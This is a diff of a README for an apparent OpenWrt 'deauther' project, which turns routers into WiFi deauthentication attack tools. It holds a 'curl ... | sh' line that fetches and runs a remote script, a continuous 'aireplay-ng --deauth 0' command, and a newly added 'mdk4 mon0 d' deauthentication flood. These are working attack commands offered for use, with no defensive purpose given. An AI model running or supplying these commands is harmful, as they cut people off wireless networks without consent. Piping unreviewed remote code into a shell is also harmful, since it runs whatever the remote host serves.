@@ -10,7 +10,7 @@ ssh root@192.168.1.1
 telnet 192.168.1.1
 ```
 # Mipsel_24kc only 
-> Any Openwrt running in this processors must be supported by mdk4
+> Any Openwrt running in this processors is supported by [mdk4](https://downloads.openwrt.org/releases/23.05.5/targets/ramips/)
  - mt7620
  - mt7621
  - mt76x8
@@ -27,7 +27,7 @@ opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-
 opkg update && opkg install curl && curl https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/monitor_mode.sh | sh
 ````
 
-# Run
+# Using aireplay-ng 
 ```sh
 sh monitor_mode.sh && airodump-ng mon0
 ```
@@ -36,6 +36,10 @@ sh monitor_mode.sh && airodump-ng mon0
 aireplay-ng --deauth 0 -a (Mac BSSID)
 ```
 
+# Using mdk4
+```sh
+sh monitor_mode.sh && mdk4 mon0 d
+```
 ## Manual
 > More info
  - aireplay-ng --help
